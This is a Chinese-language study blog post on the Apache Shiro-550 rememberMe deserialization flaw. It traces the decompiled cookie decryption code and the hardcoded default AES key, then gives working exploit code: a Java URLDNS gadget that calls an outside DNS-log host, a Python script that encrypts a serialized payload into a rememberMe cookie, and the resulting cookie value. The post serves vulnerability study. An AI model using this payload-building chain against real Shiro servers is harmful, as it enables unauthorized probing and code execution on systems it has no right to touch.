---
title: java_shiro
published: 2026-01-14
description: "java"
tags: ["java"]
category: java
draft: false

---

## shiro550

#### 1. cookie 加密过程

![img](D:\tools_D\blog\blog\src\content\posts\post6-shiro\QQ_1768534040647.png)

找 cookie 的加密过程，全局搜索 Cookie ，找到 Shiro 包中的一个类 CookieRememberMeManager 其中有两个主要方法 



`rememberSerializedIdentity()`

​    传入当前web请求的上下文持有者 subject 和 经过序列化和加密后的用户信息 serialized，可以看到 serialized 被 base64 编码后执行 cookie.saveTo() 方法，写到了 response 的 RememberMe 字段中。

```java
protected void rememberSerializedIdentity(Subject subject, byte[] serialized) {
    if (!WebUtils.isHttp(subject)) {
        if (log.isDebugEnabled()) {
            String msg = "Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to set the rememberMe cookie. Returning immediately and ignoring rememberMe operation.";
            log.debug(msg);
        }

    } else {
        HttpServletRequest request = WebUtils.getHttpRequest(subject);
        HttpServletResponse response = WebUtils.getHttpResponse(subject);
        String base64 = Base64.encodeToString(serialized);
        Cookie template = this.getCookie();
        Cookie cookie = new SimpleCookie(template);
        cookie.setValue(base64);
        cookie.saveTo(request, response);
    }
}
```



` getRememberedSerializedIdentity()`

​    先判断是不是 http 请求，再看身份是否被移除，然后获取 request 和 response，从 request 中读取 cookie ，如果是 deleteMe 字段返回 null ，否则 base64 解密，返回解密后的数据。

```java
protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) {
    if (!WebUtils.isHttp(subjectContext)) {
        if (log.isDebugEnabled()) {
            String msg = "SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to retrieve the rememberMe cookie. Returning immediately and ignoring rememberMe operation.";
            log.debug(msg);
        }

        return null;
    } else {
        WebSubjectContext wsc = (WebSubjectContext)subjectContext;
        if (this.isIdentityRemoved(wsc)) {
            return null;
        } else {
            HttpServletRequest request = WebUtils.getHttpRequest(wsc);
            HttpServletResponse response = WebUtils.getHttpResponse(wsc);
            String base64 = this.getCookie().readValue(request, response);
            if ("deleteMe".equals(base64)) {
                return null;
            } else if (base64 != null) {
                base64 = this.ensurePadding(base64);
                if (log.isTraceEnabled()) {
                    log.trace("Acquired Base64 encoded identity [" + base64 + "]");
                }

                byte[] decoded = Base64.decode(base64);
                if (log.isTraceEnabled()) {
                    log.trace("Base64 decoded byte array length: " + (decoded != null ? decoded.length : 0) + " bytes.");
                }

                return decoded;
            } else {
                return null;
            }
        }
    }
}

```

能看出来，是有方法调用到了这个 getRememberedSerializedIdentity() 方法，下一步去向上寻找。

.class 文件下层次结构总找不到前面的调用方法，进入CookieRememberMeManager 所 extends 的父类AbstractRememberMeManager 中，ctrl+f 搜索该方法，找到getRememberedPrincipals 方法。

![img](D:\tools_D\blog\blog\src\content\posts\post6-shiro\QQ_1768536348623.png)

这里的 PrincipalCollection 通常是多个 Realm（数据源） 的集合。

该方法先把 base64 解码后的数据赋值给  bytes ，然后将其做convertBytesToPrincipals() 方法的处理，赋值给 principals。

于是跟进看一下 convertBytesToPrincipals() 的实现。

![img](D:\tools_D\blog\blog\src\content\posts\post6-shiro\QQ_1768536586681.png)

做了两件事情，解密和反序列化。principals 就相当于是用户信息的明文数据了。

看一下 decrypt 怎么实现的。

![img](D:\tools_D\blog\blog\src\content\posts\post6-shiro\QQ_1768537832712.png)

获取密钥服务，然后再次调用 decrypt ，跟进发现是一个接口。查看 decrypt 的参数，第一个是加密的数据，第二个是 key 。然后跟进 key 

![img](D:\tools_D\blog\blog\src\content\posts\post6-shiro\QQ_1768538003898.png)

![img](D:\tools_D\blog\blog\src\content\posts\post6-shiro\QQ_1768538016347.png)

然后找到 key 是一个硬编码的字符串

```java
private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");

public AbstractRememberMeManager() {
    this.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);
}

public void setCipherKey(byte[] cipherKey) {
    this.setEncryptionCipherKey(cipherKey);
    this.setDecryptionCipherKey(cipherKey);
}

public void setEncryptionCipherKey(byte[] encryptionCipherKey) {
    this.encryptionCipherKey = encryptionCipherKey;
}

public void setDecryptionCipherKey(byte[] decryptionCipherKey) {
    this.decryptionCipherKey = decryptionCipherKey;
}
```

接下来跟进 deserialize 

![img](D:\tools_D\blog\blog\src\content\posts\post6-shiro\QQ_1768538528585.png)

```java
private Serializer<PrincipalCollection> serializer = new DefaultSerializer();

public Serializer<PrincipalCollection> getSerializer() {
    return this.serializer;
}
```

获取一个专门处理 PrincipalCollection 数据的默认的序列化器，然后反序列化 bytes 。其中 deserial() 方法调用了 readObject()

![img](D:\tools_D\blog\blog\src\content\posts\post6-shiro\QQ_1768538945561.png)



#### 2. shiro550 漏洞利用

 

​    如果我们 http 请求的 cookie 中带有 RememberMe 字段，会对这个字段的值进行 derserialize 操作，即调用 readObject() 方法。

#### 1. URLDNS 

```java
import java.io.*;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;


public class Main {
    public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException {
        HashMap<URL,String> map = new HashMap<>();
        URL url = new URL("http://zv45cu.dnslog.cn");

        Field field = URL.class.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url,1234);

        map.put(url,"test");


        Field field1 = URL.class.getDeclaredField("hashCode");
        field1.setAccessible(true);
        field1.set(url,-1);


        FileOutputStream a = new FileOutputStream("D:\\tools_D\\java\\java_learn\\shiro550\\src\\main\\webapp\\ser.bin");
        ObjectOutputStream out = new ObjectOutputStream(a);
        out.writeObject(map);
        out.close();

//        FileInputStream b = new FileInputStream("D:\\tools_D\\java\\java_learn\\shiro550\\src\\main\\webapp\\ser.bin");
//        ObjectInputStream i = new ObjectInputStream(b);
//        i.readObject();


    }
}
```

然后将 ser.bin 加密放入 rememberMe 字段。

```python
import uuid
import base64
from Crypto.Cipher import AES

def read_data(filename):
    file = open(filename, "rb")
    data = file.read()
    file.close()
    return data

def enc(data):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))
    return ciphertext

if __name__ == "__main__":
    data = read_data("ser.bin")
    print(enc(data))
```

得到

```
GqqleiFyRIKDczYSD3ASBDSMe3t5bcbdSZXBQjvB8yMnJdG8BKZeGQbfoUbQ2F1Z6Q8MNrwLLPa0wbphyLvlBPhRiWICjCsG6XUkr9E4oBUy0HnypoRB/6vpLZbk8mp8+iLdTc7sWTRU4Vmx72542wfvQIFg6t7NBCNmfwDxLpVBBhlvcOxEswp1iVR5lOVaH6bzuaPBPoFtl5kzP/L62T0nAjtSOt/uWgjCqoHohjMgmUR05dJlXj8G7OcXupPlic3F8+Daf4IgOHYFHRgdmGoXKF2K6ftQOhrngrZiX9eNQU7vz2vJIxWnkq6ZRicrwVickx8EYsmRqafj/6kNSUOTUBFc4phicojtg18b3B0CJQbZ2gEZ6Lpwu0U/sdM/
```

![img](D:\tools_D\blog\blog\src\content\posts\post6-shiro\QQ_1768572708120.png)



![img](D:\tools_D\blog\blog\src\content\posts\post6-shiro\QQ_1768572697074.png)



## shiro721

TODO























**参考资料**

https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/